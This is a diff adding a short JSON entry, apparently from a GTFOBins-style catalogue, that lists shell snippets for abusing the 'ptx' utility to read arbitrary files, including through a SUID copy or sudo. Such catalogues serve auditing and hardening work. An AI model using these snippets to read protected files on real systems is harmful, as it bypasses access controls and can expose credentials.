@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "file-read": [
+      {
+        
+        "code": "LFILE=file_to_read\nptx -w 5000 \"$LFILE\"\n"
+      }
+    ],
+    "suid": [
+      {
+        
+        "code": "LFILE=file_to_read\n./ptx -w 5000 \"$LFILE\"\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "LFILE=file_to_read\nsudo ptx -w 5000 \"$LFILE\"\n"
+      }
+    ]
+  }
+}
